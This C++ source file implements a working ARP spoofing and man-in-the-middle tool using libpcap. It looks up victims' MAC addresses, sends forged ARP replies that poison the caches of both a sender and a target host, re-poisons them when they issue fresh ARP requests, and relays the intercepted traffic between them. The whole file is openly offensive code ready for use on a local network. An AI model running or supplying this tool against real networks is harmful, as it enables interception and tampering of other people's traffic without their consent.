#include "arp_spoof.h"

void usage()
{
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

void convert_argv_into_ip(uint8_t* IP, char* argv)
{
    char* IPstring = strdup(argv);
    char* p = strtok(IPstring, ".");
    int i = 0;
    while(p != nullptr)
    {
        IP[i] = strtoul(p, nullptr, 10);
        p = strtok(NULL, ".");
        i++;
    }
}

void get_attacker_mac(char* dev, uint8_t* attackermac)
{
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s))
    {
        int i;
        for (i = 0; i < 6; ++i)
        {
//            printf(" %02x", static_cast<uint8_t>(s.ifr_addr.sa_data[i]));
            attackermac[i] = static_cast<uint8_t>(s.ifr_addr.sa_data[i]);
        }
        puts("\n");
    }

}


void get_node_MAC(pcap_t* fp, const uint8_t* attacker_MAC, const uint8_t* node_IP, uint8_t* node_mac)
{
    arp_packet arp_req_packet;
    //Ethernet header

    memset(arp_req_packet.eth_hdr.h_dest, 0xff, 6); //set broadcast MAC
    memcpy(arp_req_packet.eth_hdr.h_source, attacker_MAC, 6); //set source MAC
    arp_req_packet.eth_hdr.h_proto = htons(ETH_P_ARP);

    //ARP header
    arp_req_packet.arp_hdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_req_packet.arp_hdr.ea_hdr.ar_pro = htons(0x0800);
    arp_req_packet.arp_hdr.ea_hdr.ar_hln = 0x06;
    arp_req_packet.arp_hdr.ea_hdr.ar_pln = 0x04;
    arp_req_packet.arp_hdr.ea_hdr.ar_op = htons(ARPOP_REQUEST);
    memcpy(arp_req_packet.arp_hdr.arp_sha, attacker_MAC, 6);
    memset(arp_req_packet.arp_hdr.arp_tha, 0x00, 6);
    memset(arp_req_packet.arp_hdr.arp_spa, 0x00, 4);
    memcpy(arp_req_packet.arp_hdr.arp_tpa, node_IP, 4);

    //send
    u_char arp_to_send[42];
    memcpy(arp_to_send, &arp_req_packet, sizeof(arp_packet));
    if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_req_packet))) != 0)
    {
        fprintf(stderr, "\nSending ARP_Request Failed");
        return;
    }
    else
    {
        while (true)    //capturing
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(fp, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
//            printf("%u bytes captured\n", header->caplen);
            arp_packet* arp_rep_packet = reinterpret_cast<arp_packet*>(const_cast<u_char*>(packet));
            if ((memcmp(&arp_req_packet.arp_hdr.arp_tpa, arp_rep_packet->arp_hdr.arp_spa, 4) == 0 )
                    && (arp_rep_packet->eth_hdr.h_proto) == htons(ETH_P_ARP)) //checking
            {
                memcpy(node_mac, arp_rep_packet->arp_hdr.arp_sha, 6);
                return;
            }
        }
    }
}

void arp_spoof(pcap_t* fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* attacker_MAC, uint8_t* target_IP)
{
    arp_packet arp_poison;  //attack packet
    //ethernet header field
    memcpy(arp_poison.eth_hdr.h_dest, sender_MAC, 6);
    memcpy(arp_poison.eth_hdr.h_source, attacker_MAC, 6);
    arp_poison.eth_hdr.h_proto = htons(ETH_P_ARP);

    //arp header field
    arp_poison.arp_hdr.ea_hdr.ar_op = htons(ARPOP_REPLY);
    arp_poison.arp_hdr.ea_hdr.ar_hln = 0x06;
    arp_poison.arp_hdr.ea_hdr.ar_pln = 0x04;
    arp_poison.arp_hdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_poison.arp_hdr.ea_hdr.ar_pro = htons(0x0800);
    memcpy(arp_poison.arp_hdr.arp_sha, attacker_MAC, 6);
    memcpy(arp_poison.arp_hdr.arp_tha, sender_MAC, 6);
    memcpy(arp_poison.arp_hdr.arp_spa, target_IP, 4);
    memcpy(arp_poison.arp_hdr.arp_tpa, sender_IP, 4);

    //casting
    u_char arp_to_send[42];
    memcpy(arp_to_send, &arp_poison, sizeof(arp_poison));

    //send attack packet 3 times
    for (int i = 0; i < 3; i++)
    {
        if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_to_send))) != 0)
            fprintf(stderr, "\nSending ARP_Request Failed");
        else
            printf("Succeed: Sending ARP_Poison Packet.\n");
    }
}

void relaying_packet(pcap_t* fp, u_char* packet, u_int packet_len, uint8_t* attacker_mac, uint8_t* target_mac)
{
    ethhdr eth_hdr;
    u_char* pckt_to_send = new u_char[packet_len];
    memcpy(pckt_to_send, packet, packet_len);

    memcpy(&eth_hdr.h_dest, target_mac, 6);
    memcpy(&eth_hdr.h_source, attacker_mac, 6);
    memcpy(pckt_to_send, &eth_hdr, 12);

    if(pcap_sendpacket(fp, pckt_to_send, packet_len) != 0)
        printf("Failed: Packet relaying.\n");
    delete[] pckt_to_send;
}

void attack(argues args)
{
    arp_spoof(args.fp, args.sender_mac, args.sender_IP, args.host_mac, args.target_IP); //1. arp spoofing
    arp_spoof(args.fp, args.target_mac, args.target_IP, args.host_mac, args.sender_IP);
    while(true) //2. capturing~~~
    {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(args.fp, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        printf("%u bytes captured\n", header->caplen);

        arp_packet arp_pckt;
        memcpy(&arp_pckt, packet, sizeof(arp_packet));

        if(arp_pckt.eth_hdr.h_proto == htons(ETH_P_ARP) && arp_pckt.arp_hdr.ea_hdr.ar_op == htons(ARPOP_REQUEST) &&
                memcmp(&arp_pckt.arp_hdr.arp_tpa, args.target_IP, 4) == 0)
        {
           printf("Sender's ARP Request detected. Try to Reinfection...\n");
           arp_spoof(args.fp, args.sender_mac, args.sender_IP, args.host_mac, args.target_IP);
        }
        else
        {
            if ( memcmp(&(arp_pckt.eth_hdr.h_source), &(args.sender_mac), 6) == 0) //relaying (sender to target)
            {
                printf("DETECTED: sender to target packet detected.\n");
                relaying_packet(args.fp, const_cast<u_char*>(packet), header->len, args.host_mac, args.target_mac);
            }
            else if ( memcmp(&(arp_pckt.eth_hdr.h_source), &(args.target_mac), 6) == 0) // relaying (target to sender)
            {
                printf("DETECTED: target to sender packet detected.\n");
                relaying_packet(args.fp, const_cast<u_char*>(packet), header->caplen, args.host_mac, args.sender_mac);
            }
            else {
                printf("Failed: Relaying packet.\n");
            }
        }
    }
}
